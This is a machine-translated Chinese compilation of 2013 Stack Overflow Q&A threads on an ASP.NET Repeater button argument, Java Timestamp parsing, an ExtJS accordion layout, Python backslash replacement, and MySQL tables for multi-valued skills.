Repeater 在我的程序中使用数据集来填充 ItemTemplate 的标签和图像控件。我的数据集中还有另一个字段名为`graphicID`. 我想以某种方式将该字段中的值传递给“原始”按钮，这样如果用户按下该按钮，该特定`graphicID`值就会传递给点击事件。这有意义吗？

例如，第二张图片是哈洛克船长。此`graphicID`图像的`93`. 如果用户按下Captain Harlock 下的Original 按钮，我想传递`93`给`onClick`事件。不过，我不确定该怎么做。如果有人能指出我正确的方向，我将不胜感激！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T14:37:51.453

```
<div style="text-align: center;">
        <asp:Button runat="server" ID="btnNew" Text="New" />
        <asp:Button runat="server" CommandName="cmd_original" CommandArgument="name of field which you want to access" ID="btnOriginal" Text="Original" />
    </div> 
```

**编辑**

**在中继器控制中**

您必须添加一个事件，如下所示：

```
 onitemcommand="Repeater1_ItemCommand" 
```

**在后面的代码中**

```
 protected void Repeater1_ItemCommand(object source, RepeaterCommandEventArgs e)
{
    if (e.CommandName == "cmd_original")
    {
        Int32 id = Convert.ToInt32(e.CommandArgument);
    }
} 
```

# java - 如何将键盘给出的字符串转换为时间戳，然后将其与 sql 时间戳进行比较

> ID：15973992
> 
> 赞同：-2
> 
> 时间：2013-04-12T14:28:14.873
> 
> 标签：java

我想将一个看起来像 sql Timestamp 的字符串转换为实际的 Timestamp。我怎样才能做到这一点？我的字符串看起来像这样。

```
 BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
    System.out.print("Please enter StartTime (YYYY-MM-DD HH:MM:SS): ");

    String StartTime = null;

    try {
        StartTime = reader.readLine();

    } catch (IOException e) {
        e.printStackTrace();
    } 
```

然后，我想将此时间戳与 sql 数据库中的时间戳进行比较。我可以这样做吗？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:30:39.293

使用[Timestamp.valueOf](http://docs.oracle.com/javase/1.5.0/docs/api/java/sql/Timestamp.html#valueOf%28java.lang.String%29)将其转换为`java.sql.Timestamp`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:37:20.920

您可以使用 simplay 类`SimpleDateFormat`。根据文档：

`SimpleDateFormat is a concrete class for formatting and parsing dates in a locale-sensitive manner. It allows for formatting (date -> text), parsing (text -> date), and normalization.`

# javascript - Ext Panel 未在手风琴上调整大小

> ID：15973996
> 
> 赞同：0
> 
> 时间：2013-04-12T14:28:21.997
> 
> 标签：javascript, extjs, accordion

我有一个带有手风琴布局的面板，其中包含多个（最多 10 个）属性网格。

当有几个属性网格项目并且面板中有空间可以扩展它们时，这可以正常工作。但是，如果面板中充满了折叠的网格，则它们无法展开。手动增加面板的高度可以扩展它们。

自动滚动已启用。如果我将 autoHeight 设置为 true，则面板大小以适合所有折叠的项目，但不会调整大小以展开一个。

希望有人能告诉我我做错了什么。

由于与 GeoExt 的兼容性，我正在使用 Ext 3.4.0。

谢谢

汤姆

显示 2 个正确扩展的属性网格 的示例[http://s9.postimg.org/ex4e6nxwv/working.jpg](http://s9.postimg.org/ex4e6nxwv/working.jpg)）显示 10 个不会扩展的属性网格的示例 [http://s13.postimg.org/r06ylu2h3/not.jpg](http://s13.postimg.org/r06ylu2h3/not.jpg)

创建面板和属性网格的代码：

```
items.push({
  xtype: "propertygrid",
  title: title,
  source: feature.attributes,
  sorting: false
});

if (items.length > 0) {
  new GeoExt.Popup({
    title: "Feature Info - (" + items.length + " Results)" + maxFeatures,
    width: 400,
    height: 300,
    layout: "accordion",
    autoScroll: true,
    map: Map,
    location: evt.xy,
    items: items
  }).show();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-13T00:54:06.363

我不确定是否有办法让它做你想做的事情，而不用完全消除高度参数，这显然意味着它会更高。

如果你想让它保持在那个高度，你可以把它扔到另一个面板里：

```
var expandos = Ext.create('Ext.panel.Panel', {
    width: 300,
    title: 'Accordion with ' + grids.length + ' panels',
    layout: 'accordion',
    resizable: true,
    items: grids
});

Ext.create('Ext.panel.Panel', {
    renderTo: 'center_div',
    height:400,
    width:315,
    autoScroll: true,
    items:expandos
}); 
```

[http://jsfiddle.net/SFMpd/2/](http://jsfiddle.net/SFMpd/2/)

# python - Python2.7设置给定变量将一个反斜杠替换为两个反斜杠

> ID：15973998
> 
> 赞同：0
> 
> 时间：2013-04-12T14:28:24.417
> 
> 标签：python, windows, python-2.7

我对编程和编写我的第一个 python 脚本仍然很陌生。

我正在尝试使我的 python 脚本以某种方式执行，因此用户只需键入以下内容：

```
script.py \\server\location 
```

而不是执行这个

```
script.py \\\\server\\location 
```

这是我到目前为止所拥有的：

```
import sys

buildpath = sys.argv[1]
buildpath.replace(r'\\', r'\\\\')
print buildpath 
```

对此的任何帮助都非常感谢:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:29:48.663

`buildpath`调用后您没有捕获更改的变量`.replace()`。`.replace()`返回*新*字符串；字符串是不可变的，因此`.replace()`不能`buildpath`就地更改。

接下来，您使用原始字符串来定义*双*斜杠，但您想替换单斜杠。删除`r`from`r'\\'`和`r'\\\\'`; 无论如何，您不能使用单个斜杠作为原始字符串文字中的最后一个字符。

我想你想这样做：

```
buildpath = sys.argv[1]
buildpath = buildpath.replace('\\', '\\\\')
print buildpath 
```

# mysql - 具有多个值的列

> ID：15973999
> 
> 赞同：0
> 
> 时间：2013-04-12T14:28:25.790
> 
> 标签：mysql, sql

我有一张名为 Employee 的表，其中包含以下信息，例如

```
ID      Name       Skills   

1       xyz        java,php,dotnet

2       abc        ruby,java,python 
```

技能列保存逗号分隔的值。它可能是一个或多个。

我想设计一个基于`OR`operate的查询。当用户搜索java时，数据库显示两个员工喜欢xyz，abc。

我试过这个查询，但没有结果：

```
SELECT m 
FROM Employee m 
Where m.Skills LIKE '%JAVA% MS PAINT%' 
```

有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:38:34.580

理想情况下，您不应将数据存储在逗号分隔的列表中。您应该在员工和技能之间创建一个连接表：

```
CREATE TABLE employees (`e_id` int, `e_name` varchar(3));

INSERT INTO employees (`e_id`, `e_name`)
VALUES
    (1, 'xyz'),
    (2, 'abc');

CREATE TABLE skills (`s_id` int, `s_name` varchar(6));

INSERT INTO skills (`s_id`, `s_name`)
VALUES
    (1, 'java'),
    (2, 'php'),
    (3, 'dotnet'),
    (4, 'ruby'),
    (5, 'python');

CREATE TABLE employees_skills (`e_d` int, `s_id` int);

INSERT INTO employees_skills
    (`e_d`, `s_id`)
VALUES
    (1, 1),
    (1, 2),
    (1, 3),
    (2, 4),
    (2, 1),
    (2, 5); 
```

然后，当您想从表中进行选择时，您将使用：

```
select *
from employees e
inner join employees_skills es
  on e.e_id = es.e_id
inner join skills s
  on es.s_is = s.s_id
where s.s_name in ('java', 'ruby') 
```

或者您可以使用以下`OR`子句：

```
select *
from employees e
inner join employees_skills es
  on e.e_id = es.e_id
inner join skills s
  on es.s_is = s.s_id
where s.s_name = 'java'
   or s.s_name = 'ruby' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:38:57.657

使用不好的解决方案。全扫描和慢查询。使用技能目录创建新表。创建表 user_skills

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:41:33.313

你应该像这样设置你的表：

```
Employee:
ID | Name
---+------
1  | xyz
2  | abc

Skill:
ID | Name
---+------
1  | java
2  | php
3  | dotnet
4  | ruby
5  | python

EmployeeSkills:
ID | EmployeeID | SkillID
---+------------+----------
1  | 1          | 1
2  | 1          | 2
3  | 1          | 3
4  | 2          | 4
5  | 2          | 1
6  | 2          | 5 
```

查找具有 Java 技能的员工的查询如下所示

```
SELECT
    E.Name
FROM
    Employee AS E
INNER JOIN
    EmployeeSkill AS ES
ON
    ES.EmployeeID = E.ID
INNER JOIN
    Skill AS S
ON
    ES.SkillID = S.ID
WHERE
    S.Name = 'java' 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-12T14:30:57.933

`select name from table where skill like '%java%'`应该做